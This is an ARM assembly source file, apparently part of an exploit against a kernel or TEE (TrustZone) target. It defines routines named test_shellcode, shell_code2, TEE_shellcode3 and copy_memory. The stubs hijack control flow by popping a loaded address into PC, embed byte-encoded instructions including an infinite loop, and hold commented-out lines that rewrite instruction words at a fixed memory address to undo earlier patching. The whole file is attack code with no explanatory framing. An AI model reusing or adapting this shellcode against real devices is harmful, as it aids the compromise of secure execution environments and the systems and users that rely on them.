#define __ASSEMBLY__
#include  <linux/linkage.h>
//#include  "ping.h"

.extern sayhello

ENTRY(test_shellcode)

                      STMFD  SP!, {LR}
                      BX R1

ENTRY(shell_code2)
                      ldr r0, [pc , #4]
                      STMFD  SP!, {R0}
                      LDMFD   SP!, {PC}
.byte 0xee, 0xee, 0xee, 0xee
.byte 0xfe ,0xff,0xff ,0xea //loop forever




//fix patched code & return 0
 ENTRY(TEE_shellcode3)


	//code fix patched code
 	//LDR r0, =0x2E104B34
 	//LDR r1, =0xe1a00005
 	//str r1,[r0]

 	//add r0,  #4
 	//LDR r1, =0xe1a01004
 	//str r1,[r0]

 	//add r0,   #4
 	//LDR r1, =0xebfff427
 	//str r1,[r0]

 	//add r0,   #4
 	//LDR r1, =0xe1a00005
 	//str r1,[r0]


	mov r0, #0
	mov r1, #0
	add r0, pc , #0x20
	blx r0
	//LDMFD SP!,{LR}
	LDMFD SP!, {R3-R5,LR}
	BX LR


 ENTRY(copy_memory)
.byte 0xee, 0xee, 0xee, 0xee //LDR*5 so
